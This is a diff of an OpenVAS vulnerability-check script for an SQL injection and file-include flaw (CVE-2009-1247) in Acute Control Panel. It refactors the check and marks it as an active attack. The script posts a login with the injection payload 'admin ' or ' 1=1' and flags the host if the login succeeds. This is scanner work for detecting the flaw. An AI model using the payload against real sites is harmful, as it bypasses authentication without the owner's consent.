@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: acute_control_panel_34265.nasl 4574 2016-11-18 13:36:58Z teissa $
+# $Id: acute_control_panel_34265.nasl 5771 2017-03-29 15:14:22Z cfi $
 #
 # Acute Control Panel SQL Injection Vulnerability and Remote File
 # Include Vulnerability
@@ -25,19 +25,18 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.100089");
- script_version("$Revision: 4574 $");
- script_tag(name:"last_modification", value:"$Date: 2016-11-18 14:36:58 +0100 (Fri, 18 Nov 2016) $");
+ script_version("$Revision: 5771 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 17:14:22 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-29 17:14:47 +0200 (Sun, 29 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1247");
  script_bugtraq_id(34265);
-
  script_name("Acute Control Panel SQL Injection Vulnerability and Remote File Include Vulnerability");
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -65,42 +64,39 @@ include("http_keepalive.inc");
 port = get_http_port(default:80);
 if(!can_host_php(port:port))exit(0);
 
-host = http_host_name( port:port );
+foreach dir( make_list_unique( "/acute-cp", cgi_dirs( port:port ) ) ) {
 
-dirs = make_list("/acute-cp",cgi_dirs());
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
+  url = dir + "/";
+  buf = http_get_cache(item:url, port:port);
+  if( buf == NULL )continue;
 
-    url = string(dir, "/");
-    req = http_get(item:url, port:port);
-    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-    if( buf == NULL )continue;
+  if( egrep(pattern: 'meta name="generator" content="acute-cp.*" />', string: buf) ||
+      egrep(pattern: 'Powered by <a href=[^>]+>Acute CP</a>', string: buf) ) {
 
-    if( egrep(pattern: 'meta name="generator" content="acute-cp.*" />', string: buf) ||
-	egrep(pattern: 'Powered by <a href=[^>]+>Acute CP</a>', string: buf) ) {
-	    variables = string("username=admin%20%27%20or%20%27%201=1&password=");
-	    filename = string(dir + "/acute-cp/");
+    variables = string("username=admin%20%27%20or%20%27%201=1&password=");
+    url = string(dir + "/acute-cp/");
 
-	    req = string(
-	      "POST ", filename, " HTTP/1.0\r\n", 
-	      "Referer: ","http://", host, filename, "\r\n",
-	      "Host: ", host, "\r\n", 
-	      "Content-Type: application/x-www-form-urlencoded\r\n", 
-	      "Content-Length: ", strlen(variables), 
-	      "\r\n\r\n", 
-	      variables
-	    );
+    host = http_host_name( port:port );
 
-	    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-	    if( result == NULL )continue;
+    req = string(
+      "POST ", url, " HTTP/1.0\r\n", 
+      "Referer: ","http://", host, url, "\r\n",
+      "Host: ", host, "\r\n", 
+      "Content-Type: application/x-www-form-urlencoded\r\n", 
+      "Content-Length: ", strlen(variables), 
+      "\r\n\r\n", 
+      variables);
+    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+    if( res == NULL )continue;
 
-	    if(
-	       egrep(pattern: "You are now logged in", string: result) &&
-	       egrep(pattern: "Logout</a>", string: result) )
-	     {
-	         security_message(port:port);
-	         exit(0);
-	     }
+    if( egrep(pattern: "You are now logged in", string: res) &&
+        egrep(pattern: "Logout</a>", string: res) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
+  }
 }
 
-exit(99);
+exit( 99 );
